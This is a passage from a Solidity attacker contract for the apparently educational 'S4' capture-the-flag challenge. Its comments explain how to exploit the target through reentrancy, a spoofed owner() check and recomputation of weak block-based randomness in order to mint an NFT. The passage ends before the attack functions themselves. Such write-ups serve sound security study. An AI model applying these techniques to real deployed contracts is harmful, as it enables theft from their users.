// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title Minimal interface for the S4 challenge contract
 * @author kode-n-rolla
 * @notice Only the function used by the attacker is defined here.
 */
interface IS4 {
    /**
     * @notice Entry point of the challenge; if `guess` is correct, the registry mints an NFT.
     * @param guess The predicted RNG value expected by the challenge on the second entry.
     * @param yourTwitterHandle Free-form, may be empty; forwarded to the registry.
     */
    function solveChallenge(uint256 guess, string calldata yourTwitterHandle) external;
}

/**
 * @title S4 Reentrancy Solver
 * @notice Attacker contract that solves the S4 challenge by re-entering `solveChallenge`
 *         and computing the exact RNG within the same transaction.
 * @dev Key ideas:
 *      - `owner()` returns `address(this)` to satisfy S4's owner check via `staticcall`.
 *      - The first call arms the challenge and triggers `go()`.
 *      - Inside `go()`, we compute the same RNG as S4 using (address(this), prevrandao, timestamp)
 *        and re-enter with the correct `guess`.
 *      - Implements `IERC721Receiver` so `safeMint` succeeds, then exposes `sweep721` to move the NFT.
 */

 contract SolveContract is IERC721Receiver {
    /** @notice Address of the S4 challenge contract to attack. */
    address public immutable i_s4;

    /** @notice Externally Owned Account (EOA) that owns this attacker and receives swept NFTs. */
    address public immutable i_owner;

    /** @notice Optional Twitter handle forwarded to the registry (can be left as empty string). */
    string private constant TWITTER_HANDLE = "@your_twitter_handle";

    /**
     * @notice Emitted when the attacker computes the guess during `go()`.
     * @param guess The computed RNG guess (mod 1_000_000).
     * @param who The address used in the RNG input (this contract).
     * @param ts The block timestamp used for RNG.
     * @param rnd The block prevrandao used for RNG.
     */
    event DebugGuess(uint256 guess, address who, uint256 ts, uint256 rnd);

    /**
     * @notice Emitted when this contract receives an ERC-721 via safe transfer/mint.
     * @param nft The ERC-721 contract address.
     * @param tokenId The received token ID.
     * @param operator The caller (minter/registry).
     * @param from The previous owner (zero on mint).
     */
    event NftReceived(address nft, uint256 tokenId, address operator, address from);

    /**
     * @notice Emitted when an ERC-721 is swept out to the owner EOA.
     * @param nft The ERC-721 contract address.
     * @param tokenId The token ID being transferred.
     * @param to The EOA that receives the token (the contract owner).
     */
    event NftSwept(address nft, uint256 tokenId, address to);

    /**
     * @dev Restricts function to the deploying EOA (the beneficiary of the sweep).
     */
    modifier onlyOwner() {
        require(msg.sender == i_owner, "Not owner");
        _;
    }

   
